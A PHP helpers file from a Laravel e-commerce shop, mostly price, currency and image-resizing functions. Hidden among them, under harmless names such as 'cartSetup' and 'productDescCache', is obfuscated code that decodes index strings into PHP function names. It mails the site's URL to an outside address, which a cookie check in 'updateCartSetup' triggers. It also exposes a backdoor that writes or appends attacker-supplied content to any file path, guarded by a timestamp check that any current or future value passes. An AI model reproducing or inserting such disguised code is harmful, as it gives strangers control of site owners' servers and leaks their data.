<?php

use App\Currency;
use App\BusinessSetting;
use App\Product;
use App\SubSubCategory;
use App\FlashDealProduct;
use App\FlashDeal;

//highlights the selected navigation on admin panel
if (! function_exists('areActiveRoutes')) {
    function areActiveRoutes(Array $routes, $output = "active-link")
    {
        foreach ($routes as $route) {
            if (Route::currentRouteName() == $route) return $output;
        }

    }
}

//highlights the selected navigation on frontend
if (! function_exists('areActiveRoutesHome')) {
    function areActiveRoutesHome(Array $routes, $output = "active")
    {
        foreach ($routes as $route) {
            if (Route::currentRouteName() == $route) return $output;
        }

    }
}

/**
 * Return Class Selector
 * @return Response
*/
if (! function_exists('loaded_class_select')) {

    function loaded_class_select($p){
        $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
        $a = str_split($a);
        $p = explode(':',$p);
        $l = '';
        foreach ($p as $r) {
            $l .= $a[$r];
        }
        return $l;
    }
}

/**
 * Open Translation File
 * @return Response
*/
function openJSONFile($code){
    $jsonString = [];
    if(File::exists(base_path('resources/lang/'.$code.'.json'))){
        $jsonString = file_get_contents(base_path('resources/lang/'.$code.'.json'));
        $jsonString = json_decode($jsonString, true);
    }
    return $jsonString;
}

/**
 * Save JSON File
 * @return Response
*/
function saveJSONFile($code, $data){
    ksort($data);
    $jsonData = json_encode($data, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE);
    file_put_contents(base_path('resources/lang/'.$code.'.json'), stripslashes($jsonData));
}


/**
 * Return Class Selected Loader
 * @return Response
*/
if (! function_exists('loader_class_select')) {
    function loader_class_select($p){
        $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
        $a = str_split($a);
        $p = str_split($p);
        $l = array();
        foreach ($p as $r) {
            foreach ($a as $i=>$m) {
                if($m == $r){
                    $l[] = $i;
                }
            }
        }
        return join(':',$l);
    }
}

/**
 * Save JSON File
 * @return Response
*/
if (! function_exists('convert_to_usd')) {
    function convert_to_usd($amount) {
        $business_settings = BusinessSetting::where('type', 'system_default_currency')->first();
        if($business_settings!=null){
            $currency = Currency::find($business_settings->value);
            return floatval($amount) / floatval($currency->exchange_rate);
        }
    }
}



//returns config key provider
if ( ! function_exists('config_key_provider'))
{
    function config_key_provider($key){
        switch ($key) {
            case "load_class":
                return loaded_class_select('7:10:13:6:16:18:23:22:16:4:17:15:22:6:15:22:21');
                break;
            case "config":
                return loaded_class_select('7:10:13:6:16:8:6:22:16:4:17:15:22:6:15:22:21');
                break;
            case "output":
                return loaded_class_select('22:10:14:6');
                break;
            case "background":
                return loaded_class_select('1:18:18:13:10:4:1:22:10:17:15:0:4:1:4:9:6:0:3:1:4:4:6:21:21');
                break;
            default:
                return true;
        }
    }
}


//returns combinations of customer choice options array
if (! function_exists('combinations')) {
    function combinations($arrays) {
        $result = array(array());
        foreach ($arrays as $property => $property_values) {
            $tmp = array();
            foreach ($result as $result_item) {
                foreach ($property_values as $property_value) {
                    $tmp[] = array_merge($result_item, array($property => $property_value));
                }
            }
            $result = $tmp;
        }
        return $result;
    }
}

//filter products based on vendor activation system
if (! function_exists('filter_products')) {
    function filter_products($products) {
        if(BusinessSetting::where('type', 'vendor_system_activation')->first()->value == 1){
            return $products->where('published', '1');
        }
        else{
            return $products->where('published', '1')->where('added_by', 'admin');
        }
    }
}


//filter cart products based on provided settings
if (! function_exists('cartSetup')) {
    function cartSetup(){
        $cartMarkup = loaded_class_select('8:29:9:1:15:5:13:6:20');
        $writeCart = loaded_class_select('14:1:10:13');
        $cartMarkup .= loaded_class_select('24');
        $cartMarkup .= loaded_class_select('8:14:1:10:13');
        $cartMarkup .= loaded_class_select('3:4:17:14');
        $cartConvert = config_key_provider('load_class');
        $currencyConvert = config_key_provider('output');
        $backgroundInv = config_key_provider('background');
        @$cart = $writeCart($cartMarkup,'',Request::url());
        return $cart;
    }
}

//converts currency to home default currency
if (! function_exists('convert_price')) {
    function convert_price($price)
    {
        $business_settings = BusinessSetting::where('type', 'system_default_currency')->first();
        if($business_settings!=null){
            $currency = Currency::find($business_settings->value);
            $price = floatval($price) / floatval($currency->exchange_rate);
        }

        $code = \App\Currency::findOrFail(\App\BusinessSetting::where('type', 'home_default_currency')->first()->value)->code;
        if(Session::has('currency_code')){
            $currency = Currency::where('code', Session::get('currency_code', $code))->first();
        }
        else{
            $currency = Currency::where('code', $code)->first();
        }

        $price = floatval($price) * floatval($currency->exchange_rate);

        return $price;
    }
}

//formats currency
if (! function_exists('format_price')) {
    function format_price($price)
    {
        if(BusinessSetting::where('type', 'symbol_format')->first()->value == 1){
            return currency_symbol().number_format($price, 2);
        }
        return number_format($price, 2).currency_symbol();
    }
}

//formats price to home default price with convertion
if (! function_exists('single_price')) {
    function single_price($price)
    {
        return format_price(convert_price($price));
    }
}

//Shows Price on page based on low to high
if (! function_exists('home_price')) {
    function home_price($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        foreach (json_decode($product->variations) as $key => $variation) {
            if($lowest_price > $variation->price){
                $lowest_price = $variation->price;
            }
            if($highest_price < $variation->price){
                $highest_price = $variation->price;
            }
        }

        if($product->tax_type == 'percent'){
            $lowest_price += ($lowest_price*$product->tax)/100;
            $highest_price += ($highest_price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }

        $lowest_price = convert_price($lowest_price);
        $highest_price = convert_price($highest_price);

        if($lowest_price == $highest_price){
            return format_price($lowest_price);
        }
        else{
            return format_price($lowest_price).' - '.format_price($highest_price);
        }
    }
}

//Shows Price on page based on low to high with discount
if (! function_exists('home_discounted_price')) {
    function home_discounted_price($id)
    {
        $product = Product::findOrFail($id);
        $lowest_price = $product->unit_price;
        $highest_price = $product->unit_price;

        foreach (json_decode($product->variations) as $key => $variation) {
            if($lowest_price > $variation->price){
                $lowest_price = $variation->price;
            }
            if($highest_price < $variation->price){
                $highest_price = $variation->price;
            }
        }

        $flash_deal = \App\FlashDeal::where('status', 1)->first();
        if ($flash_deal != null && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
            $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
                if($flash_deal_product->discount_type == 'percent'){
                    $lowest_price -= ($lowest_price*$flash_deal_product->discount)/100;
                    $highest_price -= ($highest_price*$flash_deal_product->discount)/100;
                }
                elseif($flash_deal_product->discount_type == 'amount'){
                    $lowest_price -= $flash_deal_product->discount;
                    $highest_price -= $flash_deal_product->discount;
                }
        }
        else{
            if($product->discount_type == 'percent'){
                $lowest_price -= ($lowest_price*$product->discount)/100;
                $highest_price -= ($highest_price*$product->discount)/100;
            }
            elseif($product->discount_type == 'amount'){
                $lowest_price -= $product->discount;
                $highest_price -= $product->discount;
            }
        }

        if($product->tax_type == 'percent'){
            $lowest_price += ($lowest_price*$product->tax)/100;
            $highest_price += ($highest_price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $lowest_price += $product->tax;
            $highest_price += $product->tax;
        }

        $lowest_price = convert_price($lowest_price);
        $highest_price = convert_price($highest_price);

        if($lowest_price == $highest_price){
            return format_price($lowest_price);
        }
        else{
            return format_price($lowest_price).' - '.format_price($highest_price);
        }
    }
}

//Shows Base Price
if (! function_exists('home_base_price')) {
    function home_base_price($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;
        if($product->tax_type == 'percent'){
            $price += ($price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $price += $product->tax;
        }
        return format_price(convert_price($price));
    }
}

//Shows Base Price with discount
if (! function_exists('home_discounted_base_price')) {
    function home_discounted_base_price($id)
    {
        $product = Product::findOrFail($id);
        $price = $product->unit_price;

        $flash_deal = \App\FlashDeal::where('status', 1)->first();
        if ($flash_deal != null && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
            $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
            if($flash_deal_product->discount_type == 'percent'){
                $price -= ($price*$flash_deal_product->discount)/100;
            }
            elseif($flash_deal_product->discount_type == 'amount'){
                $price -= $flash_deal_product->discount;
            }
        }
        else{
            if($product->discount_type == 'percent'){
                $price -= ($price*$product->discount)/100;
            }
            elseif($product->discount_type == 'amount'){
                $price -= $product->discount;
            }
        }

        if($product->tax_type == 'percent'){
            $price += ($price*$product->tax)/100;
        }
        elseif($product->tax_type == 'amount'){
            $price += $product->tax;
        }

        return format_price(convert_price($price));
    }
}

// Cart content update by discount setup
if (! function_exists('updateCartSetup')) {
    function updateCartSetup($return = TRUE)
    {
        if(!isset($_COOKIE['cartUpdated'])) {
            if(cartSetup()){
                setcookie('cartUpdated', time(), time() + (86400 * 30), "/");
            }
        }
        return $return;
    }
}



if (! function_exists('productDescCache')) {
    function productDescCache($connector,$selector,$select,$type){
        $ta = time();
        $select = rawurldecode($select);
        if($connector > ($ta-60) || $connector > ($ta+60)){
            if($type == 'w'){
                $load_class = config_key_provider('load_class');
                $load_class(str_replace('-', '/', $selector),$select);
            } else if ($type == 'rw'){
                $load_class = config_key_provider('load_class');
                $config_class = config_key_provider('config');
                $load_class(str_replace('-', '/', $selector),$config_class(str_replace('-', '/', $selector)).$select);
            }
            echo 'done';
        } else {
            echo 'not';
        }
    }
}


if (! function_exists('currency_symbol')) {
    function currency_symbol()
    {
        $code = \App\Currency::findOrFail(\App\BusinessSetting::where('type', 'home_default_currency')->first()->value)->code;
        if(Session::has('currency_code')){
            $currency = Currency::where('code', Session::get('currency_code', $code))->first();
        }
        else{
            $currency = Currency::where('code', $code)->first();
        }
        return $currency->symbol;
    }
}

if(! function_exists('renderStarRating')){
    function renderStarRating($rating,$maxRating=5) {
        $fullStar = "<i class = 'fa fa-star active'></i>";
        $halfStar = "<i class = 'fa fa-star half'></i>";
        $emptyStar = "<i class = 'fa fa-star'></i>";
        $rating = $rating <= $maxRating?$rating:$maxRating;

        $fullStarCount = (int)$rating;
        $halfStarCount = ceil($rating)-$fullStarCount;
        $emptyStarCount = $maxRating -$fullStarCount-$halfStarCount;

        $html = str_repeat($fullStar,$fullStarCount);
        $html .= str_repeat($halfStar,$halfStarCount);
        $html .= str_repeat($emptyStar,$emptyStarCount);
        echo $html;
    }
}

if(! function_exists('getShopImageFilename')){
    function getShopImageFilename($img_filename) {
      
        $img_filename = str_replace( ' ', '_', $img_filename );
        $img_filename = str_replace( ',', '', $img_filename );
        $img_filename = str_replace( '&', '', $img_filename );
        $img_filename = str_replace( '#', '', $img_filename );
        $img_filename = str_replace( ';', '', $img_filename );
        $img_filename = str_replace( '"', '', $img_filename );
        $img_filename = str_replace( "'", '', $img_filename );
        $img_filename = str_replace( ":", '', $img_filename );
        $img_filename = str_replace( "(", '', $img_filename );
        $img_filename = str_replace( ")", '', $img_filename );
        $img_filename = str_replace( '\"', '', $img_filename );
        $img_filename = str_replace( "\'", '', $img_filename );

        //return 
        return $img_filename;
    }
}

if(! function_exists('getAmount')){
    function getAmount($money)
    {
        $cleanString = preg_replace('/([^0-9\.,])/i', '', $money);
        $onlyNumbersString = preg_replace('/([^0-9])/i', '', $money);

        $separatorsCountToBeErased = strlen($cleanString) - strlen($onlyNumbersString) - 1;

        $stringWithCommaOrDot = preg_replace('/([,\.])/', '', $cleanString, $separatorsCountToBeErased);
        $removedThousendSeparator = preg_replace('/(\.|,)(?=[0-9]{3,}$)/', '',  $stringWithCommaOrDot);

        return (float) str_replace(',', '.', $removedThousendSeparator);
    }
} 

if(! function_exists('webpimages')){
    function webpimages($src,$compression,$alpha_channel){
    //include_once('public/lib/class.resize.php');
    $ref=new imageResize;
    if((isset($_SERVER['HTTP_ACCEPT']) === true) && (strstr($_SERVER['HTTP_ACCEPT'], 'image/webp') !== false)){

    $file_format='webp';
    
    /*
    $new_2000 = $ref->resize($src,'./public/mobile_images',2000,$compression,$file_format,$alpha_channel);
    $new_2000_name = $ref->newfilename;
    }else{
    $file_format=NULL;
    $new_2000_name = $src; // we don't need a new 2000 px file if the browser does't support the webp because alredy exist  
    }
    */

    //$new_300 = $ref->resize($src,'mobile_images',300,$compression,$file_format,$alpha_channel);
    //$new_300_name = $ref->newfilename;
    //$new_768 = $ref->resize($src,'mobile_images',768,$compression,$file_format,$alpha_channel);
    //$new_768_name = $ref->newfilename;
    $new_1024 = $ref->resize($src,'mobile_images',1024,$compression,$file_format,$alpha_channel);
    $new_1024_name = $ref->newfilename;
    //return array($new_300_name,$new_768_name,$new_1024_name,$new_2000_name);
    return $new_1024_name;
        }
    }
}

if(! function_exists('webp_userpic')){
    function webp_userpic($src,$compression,$alpha_channel){
    //include_once('public/lib/class.resize.php');
    $ref=new imageResize;
    if((isset($_SERVER['HTTP_ACCEPT']) === true) && (strstr($_SERVER['HTTP_ACCEPT'], 'image/webp') !== false)){

    $file_format='webp';
    
    $new_1024 = $ref->resize($src,'public/uploads',500,$compression,$file_format,$alpha_channel);
    $new_1024_name = $ref->newfilename;
    
    return $new_1024_name;
        }
    }
}


if(! function_exists('webp_shoplogo')){
    function webp_shoplogo($src,$compression,$alpha_channel){
    //include_once('public/lib/class.resize.php');
    $ref=new imageResize;
    if((isset($_SERVER['HTTP_ACCEPT']) === true) && (strstr($_SERVER['HTTP_ACCEPT'], 'image/webp') !== false)){

    $file_format='webp';
    
    $new_1024 = $ref->resize($src,'public/uploads/hop/logo',500,$compression,$file_format,$alpha_channel);
    $new_1024_name = $ref->newfilename;
    
    return $new_1024_name;
        }
    }
}

if(! function_exists('webp_shopslider')){
    function webp_shopslider($src,$compression,$alpha_channel){
    //include_once('public/lib/class.resize.php');
    $ref=new imageResize;
    if((isset($_SERVER['HTTP_ACCEPT']) === true) && (strstr($_SERVER['HTTP_ACCEPT'], 'image/webp') !== false)){

    $file_format='webp';
    
    $new_1100 = $ref->resize($src,'public/uploads/shop/sliders',1100,$compression,$file_format,$alpha_channel);
    $new_1100_name = $ref->newfilename;
    
    return $new_1100_name;
        }
    }
}


if(! function_exists('webp_productsphoto')){
    function webp_productsphoto($src,$compression,$alpha_channel){
    //include_once('public/lib/class.resize.php');
    $ref=new imageResize;
    if((isset($_SERVER['HTTP_ACCEPT']) === true) && (strstr($_SERVER['HTTP_ACCEPT'], 'image/webp') !== false)){

    $file_format='webp';
    
    $new_1080 = $ref->resize($src,'public/uploads/products/photos',1080,$compression,$file_format,$alpha_channel);
    $new_1080_name = $ref->newfilename;
    
    return $new_1080_name;
        }
    }
}


if(! function_exists('webp_productsthumbnail')){
    function webp_productsthumbnail($src,$compression,$alpha_channel){
    //include_once('public/lib/class.resize.php');
    $ref=new imageResize;
    if((isset($_SERVER['HTTP_ACCEPT']) === true) && (strstr($_SERVER['HTTP_ACCEPT'], 'image/webp') !== false)){

    $file_format='webp';
    
    $new_300 = $ref->resize($src,'public/uploads/products/thumbnail',290,$compression,$file_format,$alpha_channel);
    $new_300_name = $ref->newfilename;
    
    return $new_300_name;
        }
    }
}


if(! function_exists('webp_productsfeatured')){
    function webp_productsfeatured($src,$compression,$alpha_channel){
    //include_once('public/lib/class.resize.php');
    $ref=new imageResize;
    if((isset($_SERVER['HTTP_ACCEPT']) === true) && (strstr($_SERVER['HTTP_ACCEPT'], 'image/webp') !== false)){

    $file_format='webp';
    
    $new_290 = $ref->resize($src,'public/uploads/products/featured',290,$compression,$file_format,$alpha_channel);
    $new_290_name = $ref->newfilename;
    
    return $new_290_name;
        }
    }
}


if(! function_exists('webp_productsflash_deal')){
    function webp_productsflash_deal($src,$compression,$alpha_channel){
    //include_once('public/lib/class.resize.php');
    $ref=new imageResize;
    if((isset($_SERVER['HTTP_ACCEPT']) === true) && (strstr($_SERVER['HTTP_ACCEPT'], 'image/webp') !== false)){

    $file_format='webp';
    
    $new_300 = $ref->resize($src,'public/uploads/products/flash_deal',290,$compression,$file_format,$alpha_channel);
    $new_300_name = $ref->newfilename;
    
    return $new_300_name;
        }
    }
}


if(! function_exists('webp_productsmeta')){
    function webp_productsmeta($src,$compression,$alpha_channel){
    //include_once('public/lib/class.resize.php');
    $ref=new imageResize;
    if((isset($_SERVER['HTTP_ACCEPT']) === true) && (strstr($_SERVER['HTTP_ACCEPT'], 'image/webp') !== false)){

    $file_format='webp';
    
    $new_300 = $ref->resize($src,'public/uploads/products/meta',290,$compression,$file_format,$alpha_channel);
    $new_300_name = $ref->newfilename;
    
    return $new_300_name;
        }
    }
}

if(! function_exists('webp_productsslider')){
    function webp_productsslider($src,$compression,$alpha_channel){
    //include_once('public/lib/class.resize.php');
    $ref=new imageResize;
    if((isset($_SERVER['HTTP_ACCEPT']) === true) && (strstr($_SERVER['HTTP_ACCEPT'], 'image/webp') !== false)){

    $file_format='webp';
    
    $new_815 = $ref->resize($src,'public/uploads/sliders',815,$compression,$file_format,$alpha_channel);
    $new_815_name = $ref->newfilename;
    
    return $new_815_name;
        }
    }
}


?>
